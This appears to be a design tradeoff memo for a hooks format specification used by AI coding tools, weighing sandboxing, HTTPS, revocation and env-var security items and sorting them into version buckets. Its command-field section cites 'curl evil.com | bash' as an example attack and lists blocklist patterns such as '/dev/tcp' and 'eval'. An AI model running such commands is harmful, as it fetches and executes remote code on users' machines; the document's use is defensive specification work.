| **MUST HTTPS, MUST display, SHOULD allowlist** | Adds domain allowlisting as a recommendation. Enterprises can enforce it; individuals can skip it. | Allowlist mechanism needs design. Is it per-hook? Per-organization? Per-provider? |
| **Defer to implementation** | HTTP handlers are a capability supported by 1 provider (Claude Code). Heavy specification for a niche feature is premature. | The security reviewer rates this as CRITICAL. But it's also a feature used by sophisticated users who understand the risks. |

**North star test:** HTTPS is a MUST — there's no legitimate reason for plaintext HTTP in a hook. URL display is a MUST — users should see where their data goes. Allowlisting is a policy concern (out of scope per Section 1.2).

**Cost of deferral:** Without MUST HTTPS, a hook could exfiltrate data over plaintext. Low probability (most endpoints are HTTPS) but unnecessary risk.

---

### C4. Mandatory Sandboxing

**The question:** Should the spec mandate sandboxing for hook execution?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST sandbox** | Strongest security posture. Limits blast radius of malicious hooks. | Cross-platform sandboxing is implementation-specific (seccomp, macOS sandbox, WSL, etc.). The spec can't specify the mechanism. What does "sandboxed" even mean? Read access to project but not `~/.ssh`? The details matter and they're platform-dependent. |
| **Define a reference profile, SHOULD implement** | Provides a target: "read access to project directory, no write outside project, network access only for HTTP handlers." Implementations that can't sandbox fully can document deviations. | Still a SHOULD. And the profile may not match all hook use cases (some hooks legitimately need write access outside the project). |
| **Defer to implementation** | Sandboxing is a runtime implementation concern, not a format concern. The spec defines hooks; implementations decide how to run them safely. | The security reviewer is right that distributed executable code should be sandboxed. But the spec's charter is the format, not the runtime. |

**North star test:** "Prescribe interop, permit implementation." Sandboxing is purely an implementation choice. Two implementations with different sandboxing produce identical hook behavior for well-behaved hooks. This is out of scope for a format spec.

**Cost of deferral:** Malicious hooks have full user privileges. But this is the status quo for all AI coding tool hooks today (git hooks, npm scripts, etc.). The spec doesn't make it worse.

---

### C5. Command Field Restrictions

**The question:** Should the `command` field be restricted to prevent shell injection?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST be relative path only** | Prevents `curl evil.com \| bash` in the command field. Scripts are the attack surface, not inline commands. | Breaks existing hooks. Claude Code hooks commonly use inline shell: `echo "hello"`, `grep -r pattern .`, etc. This would force every inline command into a separate script file. |
| **SHOULD be relative path, MUST NOT contain known-dangerous patterns** | Pattern blocklist (e.g., `curl\|bash`, `eval`, `/dev/tcp`). Catches trivial attacks without breaking legitimate hooks. | Blocklists are always incomplete. Sophisticated attacks bypass them easily. False sense of security. |
| **Defer to scanning (Section 5.2 of security doc)** | The spec already recommends script scanning (Section 5.2). The command field is metadata pointing to the actual payload. Restricting the pointer doesn't secure the payload. | The security reviewer's finding is valid in isolation but misframes the problem. The command field IS the executable instruction — but so is the script it points to. Restricting one without the other is security theater. |

**North star test:** "Scripts are the attack surface, not manifests" (Section 2.1 of security-considerations.md). The spec already says this. Restricting the command field to relative paths would push the attack surface into the script file — it doesn't eliminate it. This is a distribution/scanning concern, not a format concern.

**Cost of deferral:** None. A malicious actor who can set `command` can also write a malicious `check.sh`. Restricting the command field is defense-in-very-shallow-depth.

---

### C7. Revocation Mechanism

**The question:** Should the spec define a hook revocation system?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define revocation list format** | Emergency kill switch for malicious hooks. Modeled on CRL/OCSP or npm advisories. | Requires hook identity (A1). Requires a distribution mechanism for revocation lists. Requires implementations to check before execution. Significant infrastructure. |
| **Defer to distribution spec** | Revocation is a distribution concern (Section 1.2 excludes distribution from scope). The format spec can be agnostic about how hooks are distributed and revoked. | No protection against known-malicious hooks until the distribution spec exists. |

**North star test:** "Don't standardize theoretical designs. Standardize things that have been implemented and tested." No revocation mechanism has been built or tested for AI coding tool hooks. This is speculative.

**Dependency:** Blocked by A1 (hook identity).

**Cost of deferral:** No emergency kill switch. But also no hooks have been distributed via syllago's registry yet (it doesn't exist). The risk is theoretical until distribution exists.

---

### C8. Content Addressing / Version Pinning

**The question:** Should hooks be referenced by content hash (lockfile-style)?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define content addressing scheme** | Prevents silent modification. Enables reproducible hook installations. Follows npm's lockfile evolution. | Significant scope expansion. Requires defining hash algorithms, lockfile format, update workflow. This is a package manager feature, not a format feature. |
| **Defer to syllago (the tool)** | Content addressing belongs in the package manager, not the format spec. syllago can implement lockfiles without the hooks spec defining them. | No interoperability guarantee across tools that use the spec. |

**North star test:** The spec explicitly excludes "Hook distribution, packaging, or registry publishing mechanisms" from scope (Section 1.2). Content addressing is a distribution mechanism. Out of scope.

**Cost of deferral:** None for the format spec. syllago (the tool) should implement this independently.

---

### C9. Environment Variable Inheritance

**The question:** Should the spec define which env vars hooks inherit?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define minimal env + explicit requests** | Strongest security. Hooks declare needed env vars; everything else is stripped. | Breaks every existing hook that reads `PATH`, `HOME`, `USER`, or any standard env var. Massive compatibility impact. |
| **Document the risk, SHOULD sanitize sensitive vars** | Recommend stripping `LD_PRELOAD`, `LD_LIBRARY_PATH`. Document that secrets (`AWS_SECRET_ACCESS_KEY`, etc.) are visible. | Still a SHOULD. And defining "sensitive" is subjective. |
| **Defer to implementation** | Environment inheritance is a runtime concern. The spec's `env` field adds variables; what the base environment contains is implementation-specific. | Hooks inherit full environment including secrets. But this is identical to git hooks, npm scripts, and every other hook system. The spec doesn't make it worse. |

**North star test:** This is how all process-based hook systems work. Changing it would be a unilateral decision that no provider currently makes. The spec shouldn't impose constraints that no implementation enforces.

**Cost of deferral:** Hooks can read secrets from the environment. Same as every other hook system. Documenting the risk (as a SHOULD recommendation in the security doc) is appropriate.

---

### C10. Cross-Provider Blast Radius

**The question:** How should the spec address the amplification risk of hub-and-spoke conversion?

**Tradeoffs:**

This is an acknowledged risk, not an actionable spec change. The blast radius is a property of the hub-and-spoke architecture. Mitigations are:
- Content addressing (C8) — out of scope for format spec
- Revocation (C7) — depends on A1, also out of scope
- Registry scanning — implementation concern

**Recommendation:** Add a paragraph to security-considerations.md acknowledging the amplification risk. No spec changes needed.

---

### C11. TOCTOU Between Policy Check and Execution

**The question:** Should the spec require runtime hash verification before every hook execution?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST verify hashes before each execution** | Closes the TOCTOU window completely. A `session_start` hook that modifies another hook's script is caught. | Performance cost on every hook invocation. Requires hashes to exist (depends on C1). Only meaningful if hashes are mandatory. |
| **SHOULD verify, MUST verify when hashes available** | Pragmatic. If hashes exist, check them. If not, proceed. | Still optional if the distribution doesn't include hashes. |
| **Defer** | This is a runtime implementation concern. The format spec doesn't define when or how often to verify. | A session_start hook modifying other hooks' scripts is a real (if exotic) attack. |

**North star test:** Runtime behavior, not format. Out of scope for the format spec. Appropriate for syllago's implementation or for the policy spec.

**Cost of deferral:** Exotic TOCTOU attacks remain possible. Low probability in practice.

---

### C12. Generated Code Injection (OpenCode Bridge)

**The question:** Should the spec define escaping rules for code generation adapters?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define escaping rules + test vectors** | Prevents code injection in generated TypeScript. Testable. | Very specific to one provider (OpenCode). Other code-generating adapters may use different target languages. |
| **MUST escape, leave rules to adapter** | The spec already says "MUST escape all interpolated values" (Section 2.6 of security doc). The specific escaping rules depend on the target language. | Vague. An adapter author may not know what "escape" means for their context. |
| **Add adversarial test vectors** | Include test vectors with shell metacharacters, template literals, and other injection payloads. Adapter implementations verify they handle these safely. | Only useful for providers that generate code. |

**North star test:** The spec already has the right language ("MUST escape"). Adding language-specific escaping rules to a format spec is over-reaching. Adversarial test vectors would be the highest-value addition.

**Cost of deferral:** The MUST is already there. An adapter that doesn't escape is already non-conforming. Adding test vectors (as part of B4) would strengthen enforcement.

---

### C14. "Managed" Undefined in Policy Interface

**The question:** Should "managed" be defined portably?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define "managed" concretely** | Portable trust model. "Managed" means the same thing across implementations. | Very hard to define. Is a hook "managed" if it comes from a corporate registry? If it's signed? If it's code-reviewed? The answer depends on organizational policy. |
| **Defer to policy spec** | The policy interface is explicitly an interface stub. "Managed" is the policy spec's problem. | Enterprise users evaluating the format spec see a trust model they can't use. |

**North star test:** The policy interface document is explicitly not a full specification (it says so). Defining "managed" there, not here, is the right scoping decision.

**Cost of deferral:** None for the format spec. The policy spec will address this.

---

### C15. Network Access Controls for HTTP Handlers

**The question:** Should the spec define domain allowlists, cert pinning, or proxy enforcement?

**North star test:** These are enterprise policy controls. The spec explicitly excludes "Enterprise policy enforcement" from scope (Section 1.2). Out of scope.

**Cost of deferral:** None for the format spec. The policy spec should define these.

---

### C16. Execution Logging Standard

**The question:** Should the spec define a structured log format for hook executions?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define log schema** | Consistent cross-implementation audit trail. SIEM integration. | The spec is a format spec for hook manifests, not a logging spec. Log formats are implementation-specific. |
| **SHOULD log with recommended fields** | The security doc already recommends logging (Section 5.4). Expand with specific recommended fields. | Still a SHOULD. Implementations will differ. |

**North star test:** Logging is an implementation concern, not an interchange format concern. Strengthen the existing SHOULD recommendation with specific fields; don't create a normative log schema.

**Cost of deferral:** Inconsistent logging across implementations. Low interop impact.

---

### C17. Resource Limits

**The question:** Should the spec define limits on memory, processes, network connections, etc.?

**North star test:** Runtime resource management is an implementation concern. The spec defines timeout (the one resource limit that affects hook semantics). Everything else is local.

**Cost of deferral:** None. Fork bombs are possible with any process-spawning system. The spec doesn't make it worse.

---

## Category D: Ecosystem/Tooling — Design Items (8)

### D1. Spec Hosted Inside syllago Repo

**The question:** Should the spec live in its own repository?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Separate repo now** | Better optics for community adoption. "hooks-spec" org vs. "syllago/docs/spec" subdirectory. Other implementors feel ownership. | Maintenance overhead. Two repos to keep in sync. Changes to the spec require a separate PR. |
| **Separate repo at v1.0** | Wait until the spec is stable, then extract. Less overhead during active development. | The draft period is when community trust is established. Moving later may be too late for perception. |
| **Keep in syllago** | Practical. The spec evolves alongside the implementation. Single PR for spec + code changes. | "syllago's spec" perception. Other implementors may see it as proprietary. |

**North star test:** "Design for the ecosystem, not just the protocol." EditorConfig and LSP succeeded partly because they were standalone from day one. But they were also backed by large organizations (GitHub, Microsoft). For a smaller project, the overhead of a separate repo may not be justified until there's community demand.

**Cost of deferral:** Perception issue. Can be addressed at any time. Not a technical blocker.

---

### D2. CI/CD Headless Guidance

**The question:** How should hooks behave in non-interactive environments?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add normative section** | "When no interactive user is available, `decision: "ask"` MUST be treated as `"deny"`." Clear, simple, one sentence. | Already implied by Section 5.2 ("if the provider does not support interactive confirmation, it MUST be treated as `"deny"`"). CI is just a case of "no interactive confirmation support." |
| **Add non-normative appendix** | Guidance on timeouts, interactive fallbacks, and headless behavior for CI/CD contexts. | More prose to maintain. May be overly prescriptive for implementation-specific CI integrations. |
| **Defer** | Section 5.2 already covers the "ask" → "deny" fallback. CI/CD is just one context where this applies. | Users may not realize the existing rule covers CI. An explicit mention would help. |

**North star test:** The existing spec text already handles this case. An explicit callout in a non-normative note would help discoverability without adding normative surface area.

**Cost of deferral:** Users in CI contexts may not realize `decision: "ask"` falls back to deny. Low risk — the behavior is correct, just not explicitly documented for the CI use case.

---

### D3. Standalone Schema Validator

**The question:** Should a standalone validator be shipped?

**Same analysis as B6 (reference implementation).** The validator and compliance suite are the same item from different angles.

**Recommendation:** If B6 is scoped, D3 is covered. If B6 is deferred, a minimal JSON Schema + registry validator (check event names, tool names) is a lighter alternative.

---

### D4. Policy-as-Code Integration (OPA/Rego/Cedar)

**The question:** Should the spec provide mappings to existing policy engines?

**North star test:** "Enterprise policy enforcement" is explicitly out of scope (Section 1.2). The policy interface defines a vocabulary; integration with specific engines is implementation-specific.

**Cost of deferral:** Enterprise adopters build their own OPA rules. The vocabulary from policy-interface.md gives them the concepts; the mapping is their concern.

---

### D5. Hook Testing Guidance for Authors

**The question:** Should the spec provide guidance on testing hooks?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add to authoring guide (B13)** | Natural home for this content. Shows how to simulate events, test exit codes, validate output. | Depends on B13 (authoring guide). If B13 is deferred, D5 is too. |
| **Add to CONTRIBUTING.md** | Test guidance for hook authors alongside test guidance for spec contributors. | CONTRIBUTING.md is for spec contributors, not hook authors. Wrong audience. |
| **Defer** | Hook testing is implementation-specific. syllago could provide a `syllago test-hook` command. | No interop impact. Tooling concern. |

**North star test:** Tooling concern, not spec concern. syllago (the tool) should provide hook testing, not the spec.

**Cost of deferral:** Hook authors test against specific providers manually. No interop impact.

---

### D6. Batch/Bulk Conversion Semantics

**The question:** Should the spec address converting multiple manifests together?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define dedup + conflict rules** | Enterprise-ready. Handles the "100 hooks from 5 sources" case. | Massive scope expansion. Deduplication requires hook identity (A1). Conflict resolution is policy (out of scope). |
| **Defer** | The conversion pipeline (Section 12) is per-manifest. Batching is an implementation concern. Dedup and conflict resolution depend on distribution model. | No interop impact. |

**North star test:** Batch conversion is an implementation concern for tools like syllago, not a format concern.

**Cost of deferral:** None for the spec. syllago (the tool) implements batch behavior.

---

### D7. Observability Integration (OTel, Metrics)

**The question:** Should the spec define OpenTelemetry integration for hook executions?

**North star test:** Runtime observability is an implementation concern. Nowhere near format spec scope.

**Cost of deferral:** None for the spec.

---

### D9. Timing-Shift Degradation Gap

**The question:** Should before->after event mapping trigger degradation instead of just a warning?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Treat timing shift as capability loss** | A blocking `before_tool_execute` hook mapped to `afterFileEdit` is a semantic inversion. The hook fires after the damage is done. This is worse than a capability gap — it's a false sense of security. Should trigger `block` or `exclude` degradation. | Requires defining "timing shift" as a degradation trigger. Currently degradation only applies to capabilities, not to event mapping quality. |
| **Add a warning category** | Distinguish "capability degradation" warnings from "semantic approximation" warnings. The Cursor test vector already uses this language in its `_warnings`. | More warning taxonomy. Implementors need to handle multiple warning types. |
| **Keep as warning** | The current approach is honest (the warning says exactly what happened). The user sees it and can decide. | A user who doesn't read warnings has a blocking safety hook that fires after the dangerous write completes. |

**North star test:** "Security MUST is for known, exploitable risks." A safety hook that fires post-write instead of pre-write is a security gap. But this is inherent to the provider landscape (Cursor doesn't have `beforeFileEdit`). The spec can't fix Cursor — it can only document the limitation.

**The honest answer:** This is a provider limitation, not a spec bug. The spec correctly documents it with a warning. Making it trigger degradation would mean `before_tool_execute` + `matcher: "file_write"` would be excluded entirely for Cursor, which might be worse (no hook at all vs. a hook that runs slightly late).

**Cost of deferral:** The Cursor test vector warning is already explicit. Users who read it are informed. Users who don't are at risk — but that's true of all warnings.

---

## Version Strategy: Start at v0.1

**Decision:** The spec starts at `v0.1`, not `v1.0`.

**Rationale:** syllago is the only implementor. There are zero third-party adapters. The spec just went through 22 fixes and has 16+ more items pending. By every objective measure, this is initial development.

Semver is explicit: *"Major version zero (0.y.z) is for initial development. Anything MAY change at any time."*

| What changes | Impact |
|-------------|--------|
| Manifest `spec` field becomes `"hooks/0.1"` | Schema pattern change |
| Spec header becomes `Version: 0.1.0` | Editorial |
| Freedom to tighten SHOULD→MUST | Principle #2 stops being a blocker |
| Freedom to add required fields | Non-breaking under 0.x semantics |
| Scoping urgency drops | Items move from "must ship now" to "do before promoting to v1.0" |
| Honest signal to readers | "This is early, expect evolution" |

**Promotion to v1.0** happens when:
- At least one third-party adapter exists (not just syllago)
- The items in the "before v1.0" list are addressed
- The spec has been stable for at least one 0.x release cycle without breaking changes

**What this means for the tradeoff scoping:** The "v1.0" bucket below becomes "before promoting to v1.0" — work that should happen during the 0.x period but no longer needs to ship in a single release. The "v0.1" bucket is what ships now.

---

## New Finding: Inline Commands vs. Script References

**Not caught by any of the five reviewers as a distinct concern.** The `command` field currently accepts both inline shell commands (`grep -r TODO .`) and script paths (`./check.sh`) without distinguishing them. This creates real problems:

1. **Integrity verification:** You can SHA-256 hash `./check.sh` and verify before execution. You can't hash an inline command — it IS the payload, in the manifest itself. This contradicts the spec's own claim that "scripts are the attack surface, not manifests" (Section 2.1 of security-considerations.md).

2. **Security scanning:** File-based scanning tools (Section 5.2) can analyze script contents. Inline commands bypass file-based scanning entirely.

3. **Shell ambiguity:** A script file has a shebang (`#!/bin/bash`). An inline command is passed to... which shell? The spec doesn't say. `sh`? `bash`? `zsh`? Provider-dependent. Different shells handle quoting, globbing, and metacharacters differently.

4. **Platform field interaction:** `platform` overrides make sense for script paths (`check.sh` vs `check.ps1`) but are awkward for inline commands (rewriting the same logic in bash and powershell inline).

5. **Distribution model:** A script reference requires packaging the script file with the hook. An inline command is self-contained in the manifest. These are fundamentally different.

**Options:**

| Option | Pros | Cons |
|--------|------|------|
| **Separate fields: `script` vs `command`** | Unambiguous. Adapters know which they're handling. Integrity checks apply to scripts only. | Two fields where one existed. Migration from current format. |
| **Single field with `command_type: "script" \| "inline"`** | Backward-compatible (add optional field). Explicit distinction without changing the existing field. | Extra field. What's the default if omitted? |
| **Convention: `./` prefix = script, anything else = inline** | Zero spec changes. The convention already exists in practice (all test vectors use `./`). Just document it. | Relies on convention, not schema. Edge cases (what about `scripts/check.sh` without `./`?). |
| **Recommend scripts, document inline risks** | Lightest touch. Non-normative guidance. | Doesn't solve the ambiguity for adapters. |

**Recommended for v0.1:** The convention approach — document that `command` values starting with `./` or ending in a script extension (`.sh`, `.ps1`, `.py`, etc.) are script references resolved relative to the hook directory; all other values are inline shell commands. Add a non-normative note that script references are RECOMMENDED for blocking hooks because they enable integrity verification and security scanning.

**Promoted to pre-v1.0 work:** Evaluate whether a formal `command_type` field or separate `script`/`command` fields are needed based on implementation experience during the 0.x period.

---

## Systematic Principle Re-Evaluation

The initial tradeoff analysis applied principles selectively — 1-2 per item as a "north star test." This section applies all 8 principles systematically to each item and revises recommendations where the fuller analysis changes the answer.

### Principles Most Often Under-Applied

**Principle #2 ("You can loosen later; you cannot tighten")** was the most under-applied. Several items initially deferred to v1.1 create permanent conventions if implementations ship without them. Once tools emit warnings by positional index, or implementations handle unknown matchers inconsistently, tightening becomes a de facto breaking change via Hyrum's Law.

**Principle #3 ("Specify errors, not just happy paths")** was under-applied to test vector items. The spec mandates behaviors (round-trip fidelity, degradation to block) that have zero test coverage. A mandated behavior without a test vector is an unverified promise.

**Principle #8 ("Design for the ecosystem")** was under-applied to items dismissed as "tooling." Some tooling gaps make independent implementation impractical even if the prose spec is clear.

### Items That Change Scope After Full Principle Application

#### A1 (hook identity) — v1.1 → **v1.0**

| Principle | Analysis |
|-----------|----------|
| #1 Prescribe interop | No interop divergence without names. |
| **#2 Can't tighten** | **If v1.0 implementations emit warnings by positional index ("Hook 3 blocked"), that convention solidifies. Tools built around positional refs (CI scripts, dashboards) would break when names are added. Adding an optional field later is non-breaking, but the ecosystem habit of ignoring names becomes entrenched.** |
| #3 Specify errors | Warnings about unnamed hooks are less actionable. |
| #4 Ship when implemented | syllago already uses hook descriptions internally. Not a new concept. |
| #5 Say no | An optional `name` string is the minimum viable addition. One field. |
| **#6 Priority of constituencies** | **Users (who debug hooks) benefit most from names. This is the constituency that matters most.** |
| #7 Security | Names enable audit trails and policy targeting — defense in depth. |
| **#8 Ecosystem** | **Every downstream concern (B9 warnings, C7 revocation, C16 logging) is more useful with names. This is a force multiplier.** |

**Revised recommendation:** Add optional `name` field in v1.0. It's one optional string field that costs nothing to add now but becomes progressively harder to retrofit as the ecosystem grows around positional references. Principle #2 is decisive.

#### A11 (timeout_behavior) — v1.1 → **v1.0**

| Principle | Analysis |
|-----------|----------|
| **#2 Can't tighten** | **If hooks use `provider_data.claude-code.timeout_behavior` in v1.0, that path becomes the convention. Promoting to a canonical field in v1.1 means migrating existing hooks — not technically breaking, but creates the dual-path problem (old style still works, new style is preferred, both coexist forever).** |
| **#7 Security** | **"Timeout on a blocking safety hook allows the action to proceed with unmodified input" is a security-relevant behavior. Principle 7 says: security-relevant settings use MUST in the spec, not opaque provider blobs.** |
| #5 Say no | One new optional field (`timeout_action: "warn" | "block"`, default "warn"). Minimal surface area. |

**Revised recommendation:** Add `timeout_action` to the handler definition in v1.0. The note pointing to future promotion was already added — follow through now rather than creating a v1.1 migration. Principles #2 and #7 are decisive.

#### B2 (test vectors) — v1.1 → **v1.0 (Windsurf only)**

| Principle | Analysis |
|-----------|----------|
| #1 Prescribe interop | Windsurf is the second split-event provider. Without vectors, Windsurf adapter implementors have no ground truth. Split-event handling is the spec's most complex conversion path. |
| **#8 Ecosystem** | **The spec defines 8 providers but only tests 3. Adding Windsurf (the enterprise-focused split-event provider) covers the fourth architectural pattern and signals the spec is serious about cross-provider support.** |
| #4 Ship when implemented | syllago has a Windsurf adapter. The vectors can be generated from running code. |

**Revised recommendation:** Add Windsurf test vectors for v1.0. The other 4 providers (Copilot CLI, VS Code Copilot, Kiro, OpenCode) remain v1.1 — their architectural patterns are already covered by the existing 3 + Windsurf.

#### B4 (negative test vectors) — v1.1 → **v1.0 (minimal set)**

| Principle | Analysis |
|-----------|----------|
| **#2 Can't tighten** | **If implementations silently accept invalid manifests (missing required fields, unknown event names, empty hooks array), users will depend on the lax behavior. Tightening validation later becomes a breaking change in practice, even if the spec always said MUST reject. This is exactly the Postel's Law problem RFC 9413 warns about.** |
| **#3 Specify errors** | **The spec has multiple MUST reject rules (empty hooks array, etc.) with no test vectors verifying rejection. An unverified MUST is an untested promise.** |
| #5 Say no | A small set (5-6 invalid manifests) is sufficient. Don't need exhaustive negative coverage. |

**Revised recommendation:** Add a minimal set of negative test vectors in v1.0: empty hooks array, missing required fields, invalid `spec` version, and invalid `degradation` strategy value. These test the MUST-reject rules already in the spec. Don't need B9 (structured warnings) first — negative vectors just need to assert "MUST be rejected."

#### B5 (round-trip test vectors) — v1.1 → **v1.0 (one provider)**

| Principle | Analysis |
|-----------|----------|
| **#3 Specify errors** | **Full conformance (Section 13.3) mandates round-trip fidelity. The spec requires it but provides zero test vectors. This is a mandated behavior with no verification path.** |
| #8 Ecosystem | Implementors targeting Full conformance have no ground truth for decode correctness. |
| #5 Say no | One provider (Claude Code — simplest, lossless round-trip) is sufficient for v1.0. |

**Revised recommendation:** Add one round-trip test vector (Claude Code: provider-native → canonical → provider-native) in v1.0. Just enough to demonstrate the pattern and verify the "structurally equivalent" definition works in practice.

#### B16 (registry versioning / unknown values) — v1.1 → **v1.0**

| Principle | Analysis |
|-----------|----------|
| **#1 Prescribe interop** | **Unknown bare string matchers are a real interop concern. If Implementation A rejects `"matcher": "container"` (unknown tool name) and Implementation B passes it through as a literal, hooks behave differently. This is an interop divergence.** |
| **#2 Can't tighten** | **If implementations diverge on unknown-value handling, you can't reconcile them later without breaking one side.** |
| #5 Say no | One sentence: "Unknown bare string matchers MUST be passed through as literal strings with a warning." |

**Revised recommendation:** Add one sentence defining unknown-value behavior in v1.0. The full registry versioning mechanism (version field in manifests, discovery protocol) remains v1.1. Principles #1 and #2 are decisive.

### Items That Stay After Full Analysis

These items were re-evaluated against all 8 principles and the recommendation holds:

**Confirmed v1.0 (unchanged):** A2, A5, A9, A19, B3, B18, C3, C10, D2, D9.

**Confirmed v1.1 (unchanged):**

| Item | Key principle(s) confirming deferral |
|------|--------------------------------------|
| A12 (degradation trigger) | #5 Say no. Enhancement over MUST warn already applied. Can add in minor bump. |
| A13 (draft identifier) | #5 Say no. Low probability of incompatible draft changes. The migration cost isn't worth the insurance. |
| B1 (input contract) | #1 + #5. Charter is manifests, not runtime. Significant scope expansion for a format spec. |
| B7 (machine-readable registries) | #4 Ship when implemented. syllago's Go code is the de facto machine-readable source. Formal JSON registries can follow. |
| B9 (structured warnings) | #1 Prescribe interop. Warnings aren't part of the interchange format. Ecosystem concern, not interop. |
| B10 (deprecation) | #5 Say no. Nothing to deprecate yet. Adding the mechanism later is non-breaking. |
| B12 (signal handling) | #1 Prescribe interop, permit implementation. Process termination is a local choice. |
| B13 (authoring guide) | #5 Say no. Companion doc, not spec change. Can follow independently. |
| C2 (provider_data) | Existing MUST language is correct. Strengthening is editorial, not structural. Non-breaking. |
| C9 (env vars) | #1 Permit implementation. All hook systems inherit full env. Documentation improvement, not normative. |
| C12 (code gen escaping) | Covered by existing MUST. Test vectors (part of B4) strengthen enforcement. |
| C16 (logging) | #1 Permit implementation. Not an interchange format concern. |

**Confirmed out-of-scope (unchanged):** B6, B14, B15, B17, C1, C4, C5, C7, C8, C11, C14, C15, C17, D1, D3, D4, D5, D6, D7.

One out-of-scope item deserves a note:

**C1 (mandatory integrity):** Principle #7 (security MUST for known exploits) creates tension with the scope exclusion. The February 2026 CVE proves this is real. But Principle #1 (prescribe interop, permit implementation) confirms this is a distribution concern, not a format concern. **Resolution:** syllago (the tool) MUST enforce integrity. The spec's security doc should strengthen the SHOULD with more urgent language and reference the CVE directly. The normative requirement lives in the distribution layer, not the format layer.

---

## Summary: Revised Scoping Recommendations

After systematic principle application + v0.x version strategy. Buckets are now:
- **v0.1** — ship now in the first public release
- **Pre-v1.0** — address during the 0.x period before promoting to stable
- **Out-of-scope** — not the format spec's concern

### v0.1 (17 items)

Ship in the first release. Under v0.x, these aren't "permanent debt" items — we CAN change anything. But these are the items where getting it right early sets the best foundation.

| Item | Effort | Notes |
|------|--------|-------|
| **A1** (hook identity: optional `name`) | 1 field + schema + glossary | Force multiplier for warnings, logging, policy |
| **A2** (array execution order) | 1 sentence | "Hooks execute in array order within the manifest." |
| **A5** (MUST RE2) | 1 word change | SHOULD → MUST. Low adoption friction. |
| **A9** (`osx` → `macos`) | Schema + spec + test vectors | Easiest during 0.x when nothing is stable. |
| **A11** (timeout_action canonical field) | 1 field + schema | Promote from provider_data before convention solidifies. |
| **A19** (pattern matcher clarification) | 1 paragraph | "Patterns are provider-specific. Use bare strings for portability." |
| **NEW** (inline vs script distinction) | 1 paragraph + convention | Document `./` prefix convention, recommend scripts for blocking hooks. |
| **B2** (Windsurf test vectors) | 3 JSON files | Covers 4th architectural pattern (enterprise split-event). |
| **B3** (input_rewrite degradation vector) | 1-2 JSON files | Safety-critical feature with zero test coverage. |
| **B4** (minimal negative test vectors) | 4-6 JSON files | Verify MUST-reject rules are testable. |
| **B5** (one round-trip test vector) | 2 JSON files | Claude Code round-trip. Demonstrates structural equivalence. |
| **B16** (unknown value behavior) | 1 sentence | "Unknown bare string matchers MUST be passed through with a warning." |
| **B18** (changelog) | Already created | ✓ |
| **C3** (MUST HTTPS for http handlers) | 1 sentence | No legitimate reason for plaintext. |
| **C10** (blast radius acknowledgment) | 1 paragraph in security doc | Document the amplification risk. |
| **D2** (CI headless note) | 1 sentence | Non-normative note that existing ask→deny covers CI. |
| **D9** (timing shift documentation) | Test vector update | Make the before→after semantic loss more prominent. |

**Version change:** Spec field becomes `"hooks/0.1"`, header becomes `Version: 0.1.0`.

### Pre-v1.0 (12 items)

Address during the 0.x period. These improve the spec but aren't needed for the initial release. Under 0.x, we can add these freely without breaking changes.

| Item | Notes |
|------|-------|
| **A12** (degradation trigger for blocking) | Extend degradation system to blocking behavior. Enhancement. |
| **A13** (draft spec identifier) | Moot under v0.x — the version IS the instability signal. |
| **B1** (input contract) | Evaluate during 0.x whether runtime input belongs in the spec. |
| **B7** (machine-readable registries) | Publish JSON registries when there's a consumer besides syllago. |
| **B9** (structured warnings) | Formalize `_warnings` array when tooling needs it. |
| **B10** (deprecation mechanism) | Add when the first registry entry needs deprecating. |
| **B12** (signal handling) | Non-normative recommendation. Add based on implementation experience. |
| **B13** (authoring guide) | Companion doc. Write when there are hook authors besides us. |
| **C2** (provider_data strengthening) | Strengthen MUST language with concrete examples. |
| **C9** (env var documentation) | Document env inheritance risk in security doc. |
| **C12** (code gen escaping vectors) | Add adversarial test vectors. Part of B4 expansion. |
| **C16** (logging recommendations) | Strengthen SHOULD with recommended fields. |

**Promoting to v1.0 also requires:** At least one third-party adapter implementation, plus a period of 0.x stability without breaking changes.

### Out-of-Scope for Format Spec (18 items)

Implementation, distribution, policy, or tooling concerns. Addressed by syllago (the tool), the policy spec, or provider implementations — not the format spec.

| Item | Owner |
|------|-------|
| **B6** (reference impl) | syllago (IS the reference impl) |
| **B14** (new core events) | Event registry (independent of spec version) |
| **B15** (warm-process handler) | Providers (no running code to standardize) |
| **B17** (native format schemas) | Providers (own their formats) |
| **C1** (mandatory integrity) | syllago distribution layer |
| **C4** (mandatory sandboxing) | Provider implementations |
| **C5** (command field restrictions) | Distribution/scanning layer |
| **C7** (revocation) | Distribution spec (future) |
| **C8** (content addressing) | Distribution spec (future) |
| **C11** (TOCTOU) | Provider implementations |
| **C14** ("managed" definition) | Policy spec |
| **C15** (network access controls) | Policy spec |
| **C17** (resource limits) | Provider implementations |
| **D1** (separate repo) | Project governance (anytime) |
| **D3** (standalone validator) | syllago tooling |
| **D4** (OPA/Rego integration) | Enterprise implementations |
| **D5** (hook testing guidance) | syllago tooling |
| **D6** (batch conversion) | syllago implementation |
| **D7** (observability) | Provider implementations |
